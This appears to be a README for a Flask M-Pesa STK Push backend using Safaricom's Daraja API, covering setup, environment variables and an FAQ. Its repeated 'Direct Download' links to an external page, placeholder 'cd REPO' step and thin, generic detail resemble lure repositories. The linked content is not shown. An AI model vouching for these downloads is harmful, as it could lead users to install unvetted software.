# Auto-D Kenya v2026 - M-Pesa backend service 2026

> **Auto-D Kenya is a Flask-powered web backend for M-Pesa payments. In version 2026, it works with Safaricom's Daraja API to launch STK Push requests, process callback responses, and provide payment status lookups.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cartergabecghz8320/auto-d-kenya-stk-push?style=flat-square)](https://github.com/cartergabecghz8320/auto-d-kenya-stk-push)

---

<p align="center">
  <a href="https://cartergabecghz8320.github.io/auto-d-kenya-stk-push/">
    <img src="https://img.shields.io/badge/Download-Auto-D%20Kenya%20Latest-brightgreen?style=for-the-badge" alt="Download Auto-D Kenya">
  </a>
</p>

> **[Direct Download - Auto-D Kenya v2026](https://cartergabecghz8320.github.io/auto-d-kenya-stk-push/)**

---

[Download Latest Build](https://cartergabecghz8320.github.io/auto-d-kenya-stk-push/)

---

## Overview

Auto-D Kenya provides a Flask backend for managing M-Pesa payment interactions through Safaricom's Daraja API. It is aimed at web applications that need to initiate a payment request, receive confirmation callbacks, and inspect transaction status from a single service layer.

This project suits developers who are building checkout pages, billing APIs, or automation around M-Pesa payment handling. The design keeps the payment workflow focused on the core steps: trigger the request, receive the callback, and check the final outcome, while keeping secrets and deployment-specific values out of the source code.

---

## Features

- Sends M-Pesa STK Push payment requests
- Receives callback notifications from the payment gateway
- Provides an endpoint for payment status checks
- Offers a health check route for basic service monitoring
- Reads credentials and runtime settings from environment variables
- Uses Flask as the web backend foundation
- Connects to Safaricom Daraja API for payment processing

---

## Installation

Clone the repository and install the required Python dependencies:

```bash
git clone https://github.com/cartergabecghz8320/auto-d-kenya-stk-push.git
cd REPO
pip install -r requirements.txt
```

Set the required environment variables, then start the Flask application using the project's entry point or launch command for your environment.

---

## Usage

A normal payment flow looks like this:

1. Set up your Daraja API credentials and callback configuration.
2. Launch the backend service.
3. Call the STK Push endpoint to prompt the payment on the user's phone.
4. Wait for the callback to reach your configured webhook route.
5. Use the payment status endpoint whenever you need to verify the latest result.

Example workflow:

```bash
export MPESA_CONSUMER_KEY="your_key"
export MPESA_CONSUMER_SECRET="your_secret"
export MPESA_SHORTCODE="your_shortcode"
export MPESA_PASSKEY="your_passkey"
python app.py
```

After that, your frontend, billing layer, or test client can communicate with the exposed backend routes.

---

## Configuration

Auto-D Kenya uses environment variables for payment credentials and other runtime settings. Keep sensitive data outside the repository and load it when the app starts.

Example setup:

```bash
MPESA_CONSUMER_KEY=your_consumer_key
MPESA_CONSUMER_SECRET=your_consumer_secret
MPESA_SHORTCODE=your_shortcode
MPESA_PASSKEY=your_passkey
MPESA_CALLBACK_URL=https://your-domain.example/callback
```

If you prefer a `.env` file or a secret manager in production, store the same values there and make sure Flask reads them before startup.

---

## Requirements

- Web runtime support for Flask
- Python environment for the backend service
- Access to Safaricom Daraja API credentials
- Network access for payment requests and callback handling
- Storage or logging setup if you want to persist payment events or status data

---

## FAQ

**How can I tell whether the backend is up?**  
Check the health endpoint to confirm the service is reachable.

**Where do payment confirmations arrive?**  
Once an STK Push request is handled, the callback endpoint receives the payment update.

**How should credentials be stored?**  
Use environment variables for API keys and related values instead of embedding them in code.

**What if a payment response is delayed?**  
Review the callback settings, confirm the Daraja API configuration, and query the payment status endpoint for the most recent known state.

**Is this usable with another web application?**  
Yes. The service is meant to sit behind a frontend, dashboard, or custom integration that needs M-Pesa payment handling.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
